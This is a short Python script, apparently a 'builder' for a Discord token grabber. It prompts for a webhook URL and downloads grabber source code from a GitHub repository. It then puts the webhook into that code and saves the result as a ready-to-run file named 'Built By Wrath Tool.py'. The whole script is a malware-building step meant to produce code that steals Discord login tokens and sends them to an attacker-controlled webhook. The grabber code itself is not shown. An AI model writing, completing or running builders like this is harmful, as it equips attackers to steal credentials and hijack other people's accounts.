import requests
from requests import get
import os
def main():

    webhook = input('Enter webhook: ')
    r = requests.get('https://raw.githubusercontent.com/wodxgod/Discord-Token-Grabber/master/token-grabber.py').text
    r = r.replace('WEBHOOK HERE', webhook)

    with open('Built By Wrath Tool.py', 'w') as f:
        f.write(r)


 